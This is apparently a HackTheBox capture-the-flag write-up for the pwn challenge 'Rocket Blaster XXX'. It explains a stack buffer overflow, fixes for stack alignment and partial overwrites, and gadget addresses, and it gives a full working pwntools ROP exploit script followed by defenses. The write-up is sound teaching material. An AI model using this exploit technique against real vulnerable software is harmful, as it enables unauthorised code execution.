---
layout: post
title: "Rocket Blaster XXX"
date: 2027-08-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, rop, ret2win, stack-alignment, CWE-121]
---

## Overview

Rocket Blaster XXX is an Easy HTB Pwn challenge featuring a No-PIE, No-canary, NX binary with a classic [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html). A win function `fill_ammo` exists at a static address and prints the flag, but only after verifying that `rdi`, `rsi`, and `rdx` hold three specific magic values. Two non-obvious pitfalls make this more than a straightforward three-gadget ROP: `printf` inside `fill_ammo` demands 16-byte stack alignment that ROP entry breaks, and the byte-limited `read()` call forces a six-byte partial address write to fit within the payload cap.

---

## The Technique

The binary reads user input with `read(0, buf, 0x66)` into a 32-byte stack buffer. The offset to the saved return address is 40 bytes (`0x20` buf + 8 saved rbp). With No-PIE the gadget addresses are fixed, so no leak is needed — the ROP chain sets all three registers and redirects execution to `fill_ammo`.

### Pitfall 1 — stack alignment

`fill_ammo` calls `printf`, which uses SSE instructions (`movaps`) requiring `rsp ≡ 8 mod 16` at function entry. A normal `call` pushes a return address (8 bytes) before transferring control, so callers naturally satisfy this. A ROP `ret` only pops RIP — it leaves `rsp ≡ 0 mod 16`, causing `movaps` to fire a `#GP` fault. On a non-TTY remote connection stdout is fully buffered, so the fault is silent: the process dies, the buffer is discarded, and the connection closes with no output — identical to a wrong offset or wrong function address.

**Fix:** add a plain `ret` gadget as the first chain entry. It pops one extra slot, shifting `rsp` by 8, so `fill_ammo` receives the alignment `printf` requires.

### Pitfall 2 — partial address write

With the alignment `ret` added, the full chain would be:

```
40 (padding) + 8 (ret) + 8 (pop_rdi) + 8 (0xdeadbeef)
             + 8 (pop_rsi) + 8 (0xdeadbabe)
             + 8 (pop_rdx) + 8 (0xdead1337)
             + 8 (fill_ammo)
= 104 bytes — 2 over the 102-byte read() limit
```

User-space addresses on x86-64 are always less than 2⁴⁸, so the upper two bytes of any function pointer are `0x00`. Those bytes already sit at `buf+102` and `buf+103` in the parent frame (`__libc_start_main`'s stack). Sending only six bytes of the address with `p64(fill_ammo)[:6]` lets the full 64-bit value assemble correctly from memory. Use `p.send()` (not `sendline()`) to avoid a stray `\x0a` landing at byte 96 and corrupting the partial address.

---

## Solution

The three pop gadgets live inside `setup()`'s epilogue at static addresses:

```
0x40159b: pop rdx ; ret
0x40159c: ret            ← alignment fix
0x40159d: pop rsi ; ret
0x40159f: pop rdi ; ret
```

`fill_ammo` is at `0x4012f5`.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
import os, sys

BASE   = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.join(BASE, 'files/challenge/rocket_blaster_xxx')
LIBC   = os.path.join(BASE, 'files/challenge/glibc/libc.so.6')
LD     = os.path.join(BASE, 'files/challenge/glibc/ld-linux-x86-64.so.2')

context.binary = e = ELF(BINARY, checksec=False)
context.log_level = 'info'

def conn(host=None, port=None):
    if host:
        return remote(host, port)
    chal_dir = os.path.join(BASE, 'files/challenge')
    return process([LD, BINARY], env={'LD_PRELOAD': LIBC}, cwd=chal_dir)

ret_gadget = 0x40159c
pop_rdi    = 0x40159f
pop_rsi    = 0x40159d
pop_rdx    = 0x40159b
fill_ammo  = e.symbols['fill_ammo']

OFFSET = 40

def exploit(host=None, port=None):
    p = conn(host, port)
    payload  = b'A' * OFFSET
    payload += p64(ret_gadget)
    payload += p64(pop_rdi) + p64(0xdeadbeef)
    payload += p64(pop_rsi) + p64(0xdeadbabe)
    payload += p64(pop_rdx) + p64(0xdead1337)
    payload += p64(fill_ammo)[:6]
    p.recvuntil(b'>> ')
    p.send(payload)
    flag = p.recvall(timeout=5)
    print(flag.decode(errors='replace'))
    p.close()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        exploit(sys.argv[1], int(sys.argv[2]))
    else:
        exploit()
```

Run against the remote instance:

```bash
python3 solve.py <host> <port>
```

Output: `HTB{...}`

---

## Why It Worked

The [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)) exists because `read(0, buf, 0x66)` allows 102 bytes into a 32-byte buffer with no canary and no PIE to randomize the target address. The fill_ammo register checks (`cmp eax, 0xdeadbeef` etc.) use 32-bit compares so `p64(0xdeadbeef)` = `0x00000000DEADBEEF` satisfies them exactly. The only runtime mitigations are NX (handled by ROP) and the byte limit on `read()` (handled by the six-byte partial write).

---

## Fix / Defense

- **Stack canary** (`-fstack-protector-strong`): terminates the process before the corrupted return address is used.
- **PIE** (`-fPIE -pie`): randomizes binary addresses, forcing an information-leak step before any ROP can be built.
- **Bounds-checked input**: `fgets(buf, sizeof(buf), stdin)` or `read(0, buf, sizeof(buf))` — the read limit must be `≤` the buffer size, not `sizeof(buf) + 8` (which is the classic gap that exposes the saved rbp and return address on 64-bit targets).
